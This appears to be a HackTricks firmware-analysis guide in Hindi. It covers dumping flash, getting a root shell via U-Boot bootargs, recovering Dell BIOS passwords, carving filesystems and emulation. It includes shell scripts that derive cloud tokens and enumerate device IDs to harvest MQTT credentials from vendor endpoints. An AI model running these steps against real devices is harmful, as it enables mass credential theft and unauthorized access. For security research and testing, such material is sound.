# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **परिचय**

### संबंधित संसाधन

एक्सपोज़्ड hardware interfaces से firmware प्राप्त करने के लिए, [UART console-assisted firmware dumping](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) और [SPI flash dumping](../hardware-hacking/spi.md#dumping-firmware-from-eeproms) देखें। Console access से पहले, boot के समय दोहराए जा सकने वाले UART capture के लिए [SCPI-controlled power and oscilloscope acquisition](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi) देखें।

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware आवश्यक software है, जो hardware components और users द्वारा उपयोग किए जाने वाले software के बीच communication को प्रबंधित और सक्षम करके devices को सही ढंग से काम करने देता है। इसे स्थायी memory में संग्रहीत किया जाता है, ताकि device चालू होते ही उसे महत्वपूर्ण instructions मिल सकें और operating system शुरू हो सके। Security vulnerabilities की पहचान करने के लिए firmware की जाँच करना और उसमें संभावित बदलाव करना एक महत्वपूर्ण कदम है।<sup>[[2]](#references)[[3]](#references)</sup>

## **जानकारी एकत्र करना**

**जानकारी एकत्र करना** किसी device की संरचना और उसमें उपयोग की गई technologies को समझने का एक महत्वपूर्ण शुरुआती कदम है। इस प्रक्रिया में निम्नलिखित जानकारी एकत्र की जाती है:

- CPU architecture और उस पर चलने वाला operating system
- Bootloader की जानकारी
- Hardware layout और datasheets
- Codebase के metrics और source locations
- External libraries और license types
- Update history और regulatory certifications
- Architecture और data flow diagrams
- Security assessments और पहचानी गई vulnerabilities

इस काम के लिए **open-source intelligence (OSINT)** tools बहुत उपयोगी हैं। उपलब्ध open-source software components की manual और automated review के ज़रिए जाँच करना भी उतना ही उपयोगी है। [Coverity Scan](https://scan.coverity.com) और [Semmle’s LGTM](https://lgtm.com/#explore) जैसे tools मुफ़्त static analysis देते हैं, जिनका उपयोग संभावित समस्याएँ खोजने के लिए किया जा सकता है।

## **Firmware प्राप्त करना**

Firmware प्राप्त करने के कई तरीके हैं, जिनमें से हर एक की जटिलता अलग-अलग होती है:

- स्रोत से **सीधे** (developers, manufacturers)
- दिए गए निर्देशों से **बनाकर**
- आधिकारिक support sites से **download करके**
- Hosted firmware files खोजने के लिए **Google dork** queries का उपयोग करके
- [S3Scanner](https://github.com/sa7mon/S3Scanner) जैसे tools से **cloud storage** को सीधे access करके
- Man-in-the-middle techniques से **updates** intercept करके
- **UART**, **JTAG**, या **PICit** जैसे connections के ज़रिए device से **extract करके**
- Device communication में update requests को **sniff करके**
- **Hardcoded update endpoints** की पहचान करके और उनका उपयोग करके
- Bootloader या network से **dump करके**
- अन्य सभी तरीके विफल होने पर, उपयुक्त hardware tools का उपयोग करके storage chip को **निकालकर और पढ़कर**

### केवल UART logs: flash में U-Boot env के ज़रिए root shell चालू करना

अगर UART RX को अनदेखा किया जाता है (केवल logs मिलते हैं), तो भी आप offline **U-Boot environment blob में बदलाव करके** init shell चालू कर सकते हैं:<sup>[[6]](#references)</sup>

1. SOIC-8 clip और programmer (3.3V) का उपयोग करके SPI flash dump करें:
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. U-Boot env partition का पता लगाएँ, `bootargs` को संपादित करके उसमें `init=/bin/sh` शामिल करें, और blob के लिए **U-Boot env CRC32 को फिर से गणना करके सेट करें**।
3. केवल env partition को फिर से flash करें और reboot करें; UART पर shell दिखाई देना चाहिए।

यह उन embedded devices में उपयोगी है जहाँ bootloader shell disabled है, लेकिन env partition को external flash access के ज़रिए लिखा जा सकता है।

## Firmware का विश्लेषण

अब जब आपके पास **firmware है**, तो आपको यह जानने के लिए उससे जानकारी निकालनी होगी कि उसके साथ कैसे काम करना है। इसके लिए आप अलग-अलग tools इस्तेमाल कर सकते हैं:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

अगर इन tools से ज़्यादा कुछ न मिले, तो `binwalk -E <bin>` से image की **entropy** जाँचें। अगर entropy कम है, तो संभवतः image encrypted नहीं है। अगर entropy ज़्यादा है, तो संभवतः यह encrypted है (या किसी तरह compressed है)।

इसके अलावा, **firmware के अंदर मौजूद files** निकालने के लिए इन tools का उपयोग कर सकते हैं:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

या file की जाँच करने के लिए [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) का उपयोग करें।

### External flash में raw display assets

External SPI dump ज़रूरी नहीं कि MCU का executable firmware हो। Cortex-M target के लिए, हर संभावित code region की शुरुआत की तुलना device memory map से करें: सामान्य vector table की शुरुआत में ऐसा SRAM stack pointer और reset-handler address होना चाहिए जो executable memory में हो। Offset zero पर vector table न मिलना, अपने-आप में यह साबित नहीं करता कि पूरे chip में code नहीं है; अन्य offsets और boot arrangement की जाँच करें। अगर `binwalk` को कोई container न मिले, तो raw bytes की जाँच करें और [decoded SPI capture](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer) से flash read addresses को नई screens लोड करने वाली गतिविधियों से जोड़ें।<sup>[[14]](#references)</sup>

Display-asset region के लिए, PNG/JPEG मानकर चलने के बजाय संभावित pixel formats और dimensions आज़माएँ। उद्धृत device में **80×160 RGB565 little-endian** frames इस्तेमाल हुए थे: दो bytes प्रति pixel के हिसाब से एक frame **25,600 bytes** (25 KiB) का होता है, 24 kilobits का नहीं। Decoded flash-read address से screen asset का offset पता चला; researcher ने तैयार image को `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb` से convert किया, original dump में उतने ही आकार का asset बदला, `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin` से उसे लिखा, और display पर नई image की पुष्टि की। यह writable *external display assets* दिखाता है, MCU के internal firmware को निकालना या फिर से flash करना नहीं। किसी भी write से पहले original dump सुरक्षित रखें और dimensions, byte order, offset, तथा replacement length की पुष्टि करें।<sup>[[14]](#references)</sup>

### Differential flash analysis और recover किए जा सकने वाले XOR secret stores

जब किसी firmware setting का storage format documented न हो, तो पहले flash के कई matching reads लें, **ठीक एक** setting बदलें, फिर पूरे chip का दोबारा dump लेकर offsets की तुलना करें। नियंत्रित values के साथ प्रयोग दोहराने से setting को counters और write metadata से अलग पहचानने में मदद मिलती है; अगर बदलाव वहीं करने के बजाय नए offsets पर हों, तो यह append-only या log-structured store का संकेत है। Deleted/tombstoned entries को सुरक्षित रखें, क्योंकि उनका payload bytes recover किए जा सकते हैं।<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

क्षेत्र का पता लगाने के बाद, `binwalk` जैसे tools से firmware modules निकालें और Ghidra में writer/validator को reverse करें। केवल ciphertext patterns से scheme का अनुमान लगाने के बजाय, code में field boundaries, padding, key indexing और key derivation की पुष्टि करें।<sup>[[12]](#references)</sup>

#### एन्क्रिप्टेड शून्य padding से keys पुनर्प्राप्त करें

जैसा कि [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption) में बताया गया है, ज्ञात plaintext से उन्हीं offsets पर keystream bytes का पता चलता है। जब किसी fixed-size field की शून्य padding, दोहराई जाने वाली XOR key के हर index तक फैली हो, तो वह विशेष रूप से असुरक्षित होती है: एन्क्रिप्टेड padding सीधे उन key bytes को उजागर करती है, क्योंकि `0x00 XOR key_byte = key_byte`। यदि key का हर index कवर हो, तो ciphertext के आखिरी हिस्से से key पुनर्निर्मित करें और भरे हुए bytes को decrypt करें।<sup>[[12]](#references)</sup>

Dell का असुरक्षित DVAR BIOS-password format इसका ठोस उदाहरण है: 32-byte field का byte `0` plaintext होता है, जबकि bytes `1..31` में दोहराई जाने वाली 20-byte key का उपयोग होता है।<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

पासवर्ड की लंबाई `L` होने पर, XOR से पहले `L..31` तक की positions शून्य थीं। जब `L <= 12` होता है, तो ये positions हर key index को कवर करती हैं, इसलिए पूरी key और पासवर्ड को brute force के बिना रिकवर किया जा सकता है:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### ऐतिहासिक रिकॉर्ड से keys निकालें

हर रिकॉर्ड का अलग-अलग विश्लेषण न करें। DVAR key लगभग `modified_md5(device_seed || variable_GUID || password[0])` से प्राप्त होती है: device seed और GUID स्थिर होते हैं, और password पर निर्भर एकमात्र इनपुट उसका स्पष्ट पहला byte होता है। इससे हर device के लिए अधिकतम 256 keys बनती हैं, और एक ही byte से शुरू होने वाले रिकॉर्ड एक ही key साझा करते हैं। सक्रिय और हटाए गए रिकॉर्ड को उस byte के आधार पर समूहित करें; कोई छोटा ऐतिहासिक रिकॉर्ड padding के ज़रिए पूरी key लीक कर सकता है और किसी मौजूदा लंबे रिकॉर्ड को decrypt कर सकता है, जिसकी अपनी padding पर्याप्त नहीं है। इसलिए, password rotation जोखिम बढ़ा सकता है, जब पुराना ciphertext मिटाने के बजाय tombstone किया जाता है।<sup>[[12]](#references)</sup>

[`dellpwn`](https://github.com/R3n5k1/dellpwn) tool DVAR ढूँढ़ता है, उम्मीदवार रिकॉर्ड को validate करता है, passwords recover करता है और raw stored/key bytes दिखा सकता है। इसे checkout से build करें और verified flash image को इस तरह scan करें:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Custom parsers में false positives को record structure, printable-character constraints, zero-padding checks, key entropy और key के wrap होने पर consistency के आधार पर अस्वीकार करें। अगर बार-बार किए गए dumps में हर write पर कुछ ही bits बदलते दिखें, तो देखे गए masks की सूची बनाएं और इन constraints के आधार पर corrections को rank करें। लेकिन heuristic output को सटीक recovery बताने के बजाय अस्पष्ट characters की जानकारी दें।<sup>[[12]](#references)</sup>

Password verifiers में reversible ciphertext के बजाय salted, iterated one-way hash store करना चाहिए, और log-structured stores में पुराने हो चुके secret material को सुरक्षित रूप से हटाना चाहिए।<sup>[[12]](#references)</sup>

### Filesystem प्राप्त करना

ऊपर बताए गए `binwalk -ev <bin>` जैसे tools के इस्तेमाल से आप **filesystem extract** कर पाए होंगे।\
Binwalk आमतौर पर इसे **filesystem के type के नाम वाले folder** में extract करता है। ये आमतौर पर इनमें से कोई एक होता है: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs।

#### Filesystem को मैन्युअल रूप से Extract करना

कभी-कभी binwalk के signatures में filesystem के magic byte मौजूद नहीं होंगे। ऐसे मामलों में, binwalk का इस्तेमाल करके **filesystem का offset खोजें और binary से compressed filesystem को carve करें**, फिर नीचे दिए गए steps के अनुसार उसके type के आधार पर filesystem को **मैन्युअल रूप से extract करें**।

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Squashfs filesystem को carve करने के लिए निम्नलिखित **dd command** चलाएँ।

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

वैकल्पिक रूप से, निम्नलिखित command भी चलाई जा सकती है।

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs के लिए (ऊपर दिए गए उदाहरण में उपयोग किया गया)

`$ unsquashfs dir.squashfs`

इसके बाद फ़ाइलें "`squashfs-root`" directory में होंगी।

- CPIO archive फ़ाइलें

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 filesystems के लिए

`$ jefferson rootfsfile.jffs2`

- NAND flash वाले ubifs filesystems के लिए

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### विभाजित embedded root filesystems का पुनर्निर्माण

यदि raw eMMC/SSD dump में filesystem header मान्य हो, लेकिन उसके metadata offsets nominal partition की सीमा से आगे जाते हों, तो उसे तुरंत corrupt न मानें। Embedded boot code, Device Mapper की मदद से कई physical ranges से असली root device तैयार कर सकता है, इसलिए एक GPT partition से carving करने पर केवल पहला segment मिलता है।<sup>[[9]](#references)</sup>

#### पूरे media image की शुरुआती जाँच करें

पहले पुष्टि करें कि acquisition पूरा हो चुका है, आकार स्थिर है और कोई writer अभी भी image को उपयोग में नहीं रखे हुए है। यदि filename में start/end address दिया गया हो, तो उस range की तुलना वास्तविक byte count से करें। GPT को read-only mode में recover करें और केवल आवश्यक range attach करें; workstation पर किसी untrusted physical volume के विरुद्ध `vgchange -ay` **न चलाएँ**, क्योंकि volume-group collisions और अनचाहे writes हो सकते हैं।<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

जब मूल init logic या LVM stack को पूरी image देखनी हो, तो disposable VM का उपयोग करें। Standard boot partition के ऐतिहासिक boot logs विशेष रूप से उपयोगी होते हैं: bootloader ने proprietary-container offsets, component lengths, slot selection, alignment rules और signature verification के बारे में लॉग किया हो सकता है। इन मानों का उपयोग करके embedded command line/kernel/initramfs को अलग निकालें, फिर हर output को `file`, magic bytes और `binwalk` से स्वतंत्र रूप से validate करें; container के अंत तक पढ़ने से kernel के साथ गलती से initrd, ACPI object या signature जुड़ सकता है।<sup>[[9]](#references)</sup>

#### Boot-time block map पुनर्प्राप्त करें

Kernel का initramfs निकालें और उसके `/init` तथा किसी भी storage library को reverse करें। [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) में, `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` और partition paths के string references खोजें; फिर उस code को trace करें जो active A/B slot चुनता है और table बनाता है। radare2 में शुरुआत के लिए उपयोगी commands हैं: `r2 -A init`, `afl`, `pdf @ main` और `pdf @ fcn.xxxxx`।<sup>[[9]](#references)</sup>

Linear target किसी virtual device के लगातार ranges को एक या अधिक backing devices के ranges पर map करता है। दो segments वाली आमतौर पर पुनर्प्राप्त table का आकार इस प्रकार होता है (सभी positions और lengths 512-byte sectors में हैं):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

मशीन-कोड की arithmetic को बिल्कुल वैसा ही दोहराएँ, जिसमें integer width, shifts और unit conversions भी शामिल हों। उदाहरण के लिए, निम्नलिखित expression byte size को पहले 4-KiB boundary तक floor करता है और उसके बाद ही उसे 512-byte sectors में convert करता है; इसे `p4_bytes // 512` से बदलने पर, जब भी partition page-aligned न हो, चुना गया tail `p4_bytes % 4096` जितना खिसक जाता है।<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

GPT से प्राप्त offsets, उलटी sector counts और परिणामी output length को अलग-अलग assertions के रूप में रखते हुए, पूरा media dump memory में load करने के बजाय table में दिए क्रम के अनुसार सीमित chunks कॉपी करके एक flat analysis image पुनर्निर्मित करें। इससे host-side mapper devices बनाने से भी बचा जा सकता है।<sup>[[9]](#references)</sup>

#### corruption और constant reconstruction error में अंतर करें

SquashFS के लिए, `unsquashfs` चलाने से पहले `hsqs` magic जाँचें और superblock offset 40 पर little-endian 64-bit `bytes_used` field को decode करें। यदि extraction कई असंबंधित structures में विफल होती है, तो अपेक्षित positions के आसपास एक व्यापक window में खोजें और मज़बूत structural candidates की पुष्टि करें: एक decompressible metadata block, लगातार कई valid directory entries, plausible inode fields, inode count के अनुरूप root inode, या valid integrity-metadata structure। केवल एक magic match पर्याप्त नहीं है।<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

जब वही signed delta स्वतंत्र structures को valid बनाता है—उदाहरण के लिए, directory metadata और verity record—तो संभावित कारण bytes की कमी के बजाय segment-start में व्यवस्थित त्रुटि है। orphan recovery या filesystem metadata patch करने की कोशिश से पहले reversed arithmetic पर लौटें और discarded remainders, signedness, overflow या sector/page rounding की जाँच करें।<sup>[[9]](#references)</sup>

अंत में, protection boundaries को अलग रखें: TPM-sealed LUKS volumes डेटा की confidentiality की रक्षा करते हैं, जबकि signed dm-verity mapping root-filesystem integrity की रक्षा करती है। Software TPM, original physical TPM से sealed key को recover नहीं कर सकता; और verity verification को छोड़ने वाले research-only init के ज़रिए modified SquashFS को boot करने से उसका signature forge नहीं होता या dm-verity टूटता नहीं है।<sup>[[9]](#references)</sup>

## Firmware का विश्लेषण

Firmware प्राप्त हो जाने के बाद, उसकी structure और संभावित vulnerabilities को समझने के लिए उसका विश्लेषण करना आवश्यक है। इस प्रक्रिया में firmware image का विश्लेषण करने और उससे उपयोगी data निकालने के लिए विभिन्न tools का उपयोग किया जाता है।

### शुरुआती विश्लेषण के Tools

Binary file (जिसे `<bin>` कहा गया है) के शुरुआती निरीक्षण के लिए commands का एक सेट दिया गया है। ये commands file types की पहचान करने, strings निकालने, binary data का विश्लेषण करने और partition तथा filesystem के विवरण समझने में मदद करती हैं:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

इमेज की encryption स्थिति का आकलन करने के लिए `binwalk -E <bin>` से **entropy** जाँची जाती है। कम entropy, encryption की कमी का संकेत देती है, जबकि अधिक entropy संभावित encryption या compression दर्शाती है।

**embedded files** निकालने के लिए, **file-data-carving-recovery-tools** documentation और files की जाँच के लिए **binvis.io** जैसे tools और resources की सिफारिश की जाती है।

### Filesystem निकालना

`binwalk -ev <bin>` का उपयोग करके आमतौर पर filesystem निकाला जा सकता है। यह अक्सर filesystem के प्रकार (जैसे squashfs, ubifs) के नाम वाली directory में निकाला जाता है। हालाँकि, जब magic bytes न होने के कारण **binwalk** filesystem के प्रकार को पहचानने में विफल रहता है, तो इसे manually निकालना आवश्यक होता है। इसमें `binwalk` से filesystem का offset ढूँढ़ना और फिर filesystem को carve out करने के लिए `dd` command का उपयोग करना शामिल है:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

इसके बाद, filesystem के प्रकार (जैसे squashfs, cpio, jffs2, ubifs) के आधार पर, इसकी सामग्री को मैन्युअल रूप से extract करने के लिए अलग-अलग commands का उपयोग किया जाता है।

### Filesystem का विश्लेषण

Filesystem extract करने के बाद, security flaws की खोज शुरू होती है। असुरक्षित network daemons, hardcoded credentials, API endpoints, update server की सुविधाओं, uncompiled code, startup scripts और offline analysis के लिए compiled binaries पर ध्यान दिया जाता है।

जांचने के लिए **मुख्य स्थानों** और **आइटम** में शामिल हैं:

- user credentials के लिए **etc/shadow** और **etc/passwd**
- **etc/ssl** में SSL certificates और keys
- संभावित vulnerabilities के लिए configuration और script files
- आगे के analysis के लिए embedded binaries
- सामान्य IoT device web servers और binaries

Filesystem में संवेदनशील जानकारी और vulnerabilities का पता लगाने में कई tools मदद करते हैं:

- संवेदनशील जानकारी खोजने के लिए [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) और [**Firmwalker**](https://github.com/craigz28/firmwalker)
- व्यापक firmware analysis के लिए [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- static और dynamic analysis के लिए [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) और [**EMBA**](https://github.com/e-m-b-a/emba)

### Compiled Binaries पर Security Checks

Filesystem में मिले source code और compiled binaries, दोनों की vulnerabilities के लिए बारीकी से जांच की जानी चाहिए। Unix binaries के लिए **checksec.sh** और Windows binaries के लिए **PESecurity** जैसे tools उन असुरक्षित binaries की पहचान करने में मदद करते हैं जिनका exploit किया जा सकता है।

## Derived URL tokens के ज़रिए cloud config और MQTT credentials हासिल करना

कई IoT hubs हर device के लिए configuration ऐसे cloud endpoint से प्राप्त करते हैं:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Firmware analysis के दौरान पता चल सकता है कि `<token>` को device ID से, locally और hardcoded secret का उपयोग करके, derive किया जाता है। उदाहरण के लिए:

- token = MD5( deviceId || STATIC_KEY ) और इसे uppercase hex के रूप में दर्शाया जाता है

इस डिज़ाइन से deviceId और STATIC_KEY जानने वाला कोई भी व्यक्ति URL को फिर से बना सकता है और cloud config प्राप्त कर सकता है। इसमें अक्सर plaintext MQTT credentials और topic prefixes सामने आ जाते हैं।

व्यावहारिक कार्यप्रवाह:

1) UART boot logs से deviceId extract करें

- 3.3V UART adapter (TX/RX/GND) connect करें और logs capture करें:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- उन लाइनों को खोजें जो cloud config URL pattern और broker address प्रिंट करती हैं, उदाहरण के लिए:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) firmware से STATIC_KEY और token algorithm recover करें

- binaries को Ghidra/radare2 में load करें और config path ("/pf/") या MD5 usage खोजें।
- algorithm की पुष्टि करें (जैसे, MD5(deviceId||STATIC_KEY))।
- Bash में token derive करें और digest को uppercase करें:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) cloud config और MQTT credentials इकट्ठा करें

- URL तैयार करें और curl से JSON प्राप्त करें; secrets निकालने के लिए jq से parse करें:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) plaintext MQTT और कमजोर topic ACLs का दुरुपयोग (यदि मौजूद हों)

- प्राप्त credentials का उपयोग करके maintenance topics को subscribe करें और संवेदनशील events खोजें:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) अनुमानित device IDs की सूची बनाएँ (बड़े पैमाने पर, अनुमति के साथ)

- कई ecosystems में vendor OUI/product/type bytes के बाद एक क्रमिक suffix होता है।
- आप candidate IDs को क्रम से जाँच सकते हैं, tokens निकाल सकते हैं और programmatically configs प्राप्त कर सकते हैं:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

नोट्स
- Mass enumeration का प्रयास करने से पहले हमेशा स्पष्ट authorization प्राप्त करें।
- जहाँ संभव हो, target hardware में बदलाव किए बिना secrets पुनर्प्राप्त करने के लिए emulation या static analysis को प्राथमिकता दें।

Firmware को emulate करने की प्रक्रिया किसी device के operation या किसी individual program का **dynamic analysis** करने में सक्षम बनाती है। इस approach में hardware या architecture dependencies से जुड़ी चुनौतियाँ आ सकती हैं, लेकिन root filesystem या specific binaries को matching architecture और endianness वाले device, जैसे Raspberry Pi, या pre-built virtual machine में transfer करने से आगे की testing आसान हो सकती है।

### Individual Binaries को Emulate करना

Single programs की जाँच के लिए, program की endianness और CPU architecture की पहचान करना महत्वपूर्ण है।

#### MIPS Architecture का उदाहरण

MIPS architecture binary को emulate करने के लिए, यह command इस्तेमाल की जा सकती है:

```bash
file ./squashfs-root/bin/busybox
```

और आवश्यक इम्यूलेशन टूल इंस्टॉल करने के लिए:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

MIPS (big-endian) के लिए `qemu-mips` का उपयोग किया जाता है, और little-endian binaries के लिए `qemu-mipsel` उपयुक्त विकल्प है।

#### ARM Architecture Emulation

ARM binaries के लिए प्रक्रिया समान है; emulation हेतु `qemu-arm` emulator का उपयोग किया जाता है।

### Full System Emulation

[Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) और अन्य tools full firmware emulation को आसान बनाते हैं। ये प्रक्रिया को automate करते हैं और dynamic analysis में सहायता करते हैं।

### Emulation के लिए split और verified root filesystems का पुनर्निर्माण

अगर SquashFS superblock पढ़ा जा सकता है, लेकिन inode, directory या fragment-table offsets असंभव लगते हैं, तो तुरंत `unsquashfs` को patch न करें। शुरुआती boot binary को reverse करें और उसके द्वारा बनाए गए block-device graph को दोबारा तैयार करें: embedded systems में नाममात्र का root partition दिख सकता है, लेकिन असली filesystem `dm-linear` mapping से बनाया जा सकता है, जो किसी अन्य partition से लिए गए sectors को जोड़ती है। Superblock की जाँच सफल हो सकती है, भले ही बाद के सभी metadata blocks विस्थापित हों।<sup>[[11]](#references)</sup>

Firmware में इस्तेमाल हुए arithmetic को बिल्कुल वैसा ही रखें। खास तौर पर, पता करें कि lengths bytes, 512-byte sectors या 4 KiB pages में हैं; shifts और truncation को मूल क्रम में दोहराएँ; और A/B layouts में bank पर निर्भर tail regions का हिसाब रखें। उदाहरण के लिए, `(partition_bytes >> 12) << 3` पहले 4 KiB boundary तक truncate करता है और फिर नतीजे को 512-byte sectors में व्यक्त करता है; इसे `partition_bytes // 512` से बदलने पर जोड़ा गया extent कुछ kilobytes खिसक सकता है और उसके बाद की सभी SquashFS tables corrupt हो सकती हैं।<sup>[[11]](#references)</sup>

एक उपयोगी validation workflow यह है:<sup>[[11]](#references)</sup>

1. Verifier/init binary से हर `dm-linear` segment का source device, start sector और length निकालें।
2. Alignment semantics बदले बिना extents को concatenate या map करें।
3. अगर extraction फिर भी विफल हो, तो अनुमानित boundary के आसपास केवल एक छोटी window में खोजें और सिर्फ एक plausible superblock को स्वीकार करने के बजाय लगातार कई valid metadata structures की पुष्टि करें।
4. Reconstructed image पर बिना बदलाव वाला `unsquashfs` चलाएँ; सभी directories और fragments को सफलतापूर्वक traverse करना, `unsquashfs -stat` से अधिक मजबूत प्रमाण है।

#### Analyst-controlled dm-verity replacement

जब analyst के नियंत्रण में QEMU kernel, initramfs और virtual disks हों, तो vendor के verification PID 1 को एक छोटे statically linked init से बदलकर modified root boot किया जा सकता है। यह **lab boot-chain substitution** है, dm-verity, उसके RSA signature, Secure Boot या TPM-sealed key को तोड़ना नहीं।<sup>[[11]](#references)</sup>

Replacement init को मूल boot path के operational हिस्सों की नकल करनी चाहिए: `devtmpfs` mount करना, `setsid()` call करना, `/dev/console` को file descriptors 0–2 से जोड़ना, `/proc` और `/sys` mount करना, दिए गए block device के आने तक प्रतीक्षा करना, edited root को read-only mount करना, पुराने root के pseudo-filesystems detach करना, नए mount को `/` पर ले जाना, `chroot` करना और firmware के मूल `/sbin/init` को `execve()` करना। `MS_MOVE` से **पहले** `/dev`, `/proc` और `/sys` को detach करने से नए root से संबंधित mount points गलती से detach नहीं होते।<sup>[[11]](#references)</sup>

Mutable device state को modified immutable root से अलग रखें। qcow2 overlay मूल disk की LVM state को सुरक्षित रख सकता है, जबकि दूसरा read-only virtio disk edited SquashFS उपलब्ध करा सकता है:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Offline image-state debugging

